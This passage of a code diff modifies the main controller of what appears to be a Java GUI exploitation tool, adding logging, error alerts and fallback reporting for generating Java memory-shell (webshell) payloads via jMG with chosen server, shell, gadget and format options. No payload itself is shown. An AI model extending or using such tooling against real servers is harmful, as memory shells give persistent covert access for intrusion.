+                    "Echo 生成失败",
+                    "来源：" + this.displaySourceName(result.getSource()),
+                    this.buildEchoFailureGuidance(result));
+        }
     }
 
     @FXML
@@ -505,17 +1485,46 @@ public class MainController {
         if (this.attackService == null) {
             this.initAttack();
         }
-        String source = this.memshellSourceOpt.getValue();
-        MemshellGenerateResult result = this.attackService.generateMemshellWithThirdParty(
-            source,
-            this.jmgToolOpt.getValue(),
-            this.jmgServerOpt.getValue(),
-            this.jmgShellOpt.getValue(),
-            this.jmgFormatOpt.getValue(),
-            this.jmgGadgetOpt.getValue(),
-            this.memShellOpt.getValue()
-        );
-        this.memshellGeneratorOutput.appendText("[" + result.getSource() + "] " + (result.isSuccess() ? "success" : "failed") + "\n");
+        String selectedSource = this.memshellSourceOpt.getValue();
+        AppLogger.info("内存马生成: source=" + selectedSource + ", server=" + this.jmgServerOpt.getValue() + ", tool=" + this.jmgToolOpt.getValue() + ", shell=" + this.jmgShellOpt.getValue() + ", format=" + this.jmgFormatOpt.getValue() + ", gadget=" + this.jmgGadgetOpt.getValue());
+        if (selectedSource == null || selectedSource.trim().isEmpty()) {
+            selectedSource = "传统模式";
+            this.memshellSourceOpt.setValue("传统模式");
+        }
+        String source = this.normalizeMemshellSource(selectedSource);
+        String selectedServer = this.jmgServerOpt.getValue();
+        String selectedShell = this.jmgShellOpt.getValue();
+        String jmgWarning = this.buildJmgSelectionWarning(selectedServer, selectedShell);
+        if (jmgWarning != null && "jMG".equalsIgnoreCase(source)) {
+            this.memshellGeneratorOutput.appendText("[提示] " + jmgWarning.replace("\n", " ") + "\n");
+        }
+        MemshellGenerateResult result;
+        try {
+            result = this.attackService.generateMemshellWithThirdParty(
+                    source,
+                    this.jmgToolOpt.getValue(),
+                    selectedServer,
+                    selectedShell,
+                    this.jmgFormatOpt.getValue(),
+                    this.jmgGadgetOpt.getValue(),
+                    this.memShellOpt.getValue()
+            );
+        } catch (Exception ex) {
+            this.memshellGeneratorOutput.appendText("[Memshell] exception: " + ex.getMessage() + "\n");
+            this.memshellGeneratorOutput.appendText("-------------------------------------------------\n");
+            this.showGuidanceAlert(
+                    AlertType.ERROR,
+                    "内存马载荷生成异常",
+                    ex.getClass().getSimpleName(),
+                    "未预期异常：" + ex.getMessage() + "\n\n"
+                            + "建议：来源改为 Legacy；确认 jmg-sdk 已安装；使用 JDK 8 运行。\n");
+            return;
+        }
+        String resultTitle = this.displaySourceName(selectedSource);
+        if (result.getFallbackSource() != null && !result.getFallbackSource().trim().isEmpty()) {
+            resultTitle = this.displaySourceName(result.getFallbackSource()) + " -> " + this.displaySourceName(result.getSource());
+        }
+        this.memshellGeneratorOutput.appendText("[" + resultTitle + "] " + (result.isSuccess() ? "success" : "failed") + "\n");
         if (result.getPayload() != null) {
             this.memshellGeneratorOutput.appendText(result.getPayload() + "\n");
         }
@@ -528,6 +1537,27 @@ public class MainController {
         if (result.getMessage() != null) {
             this.memshellGeneratorOutput.appendText("message: " + result.getMessage() + "\n");
         }
+        if (result.getToolType() != null || result.getServerType() != null || result.getShellType() != null || result.getFormatType() != null || result.getGadgetType() != null) {
+            this.memshellGeneratorOutput.appendText("selection: server=" + String.valueOf(result.getServerType())
+                    + ", tool=" + String.valueOf(result.getToolType())
+                    + ", shell=" + String.valueOf(result.getShellType())
+                    + ", format=" + String.valueOf(result.getFormatType())
+                    + ", gadget=" + String.valueOf(result.getGadgetType()) + "\n");
+        }
+        if (result.getFallbackSource() != null && !result.getFallbackSource().trim().isEmpty()) {
+            this.memshellGeneratorOutput.appendText("third-party source: " + this.displaySourceName(result.getFallbackSource()) + "\n");
+            if (result.getFallbackMessage() != null && !result.getFallbackMessage().trim().isEmpty()) {
+                this.memshellGeneratorOutput.appendText("third-party error: " + result.getFallbackMessage() + "\n");
+            }
+            this.memshellGeneratorOutput.appendText("fallback: 已自动回退到" + this.displaySourceName(result.getSource()) + "并生成成功\n");
+        }
         this.memshellGeneratorOutput.appendText("-------------------------------------------------\n");
+        if (!result.isSuccess()) {
+            this.showGuidanceAlert(
+                    AlertType.WARNING,
+                    "内存马载荷生成失败",
+                    "来源：" + this.displaySourceName(result.getSource()),
+                    this.buildMemshellFailureGuidance(result));
+        }
     }
 }
